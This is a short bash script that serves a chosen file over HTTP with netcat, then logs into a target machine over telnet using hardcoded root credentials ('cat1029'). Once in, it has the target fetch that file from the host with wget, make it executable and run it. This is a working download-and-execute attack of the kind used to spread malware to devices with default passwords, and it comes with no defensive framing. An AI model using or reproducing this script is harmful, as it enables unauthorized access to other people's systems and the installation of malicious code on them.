#!/bin/bash

#Parameter 1 is file
#Parameter 2 is host's IP
#Parameter 3 is target IP.

((echo -ne "HTTP/1.1 200 Ok\r\n\r\n"; cat $1) | nc -l 8080 ) &

(sleep .5; echo root; sleep .5; echo cat1029; sleep .5; echo "cd /tmp";sleep .2; echo "rm ${1}"; sleep .2; echo "wget http://${2}:8080/$1"; sleep .5; echo "chmod +x $1"; sleep .1; echo "./$1"; sleep .5)|nc ${3} 23

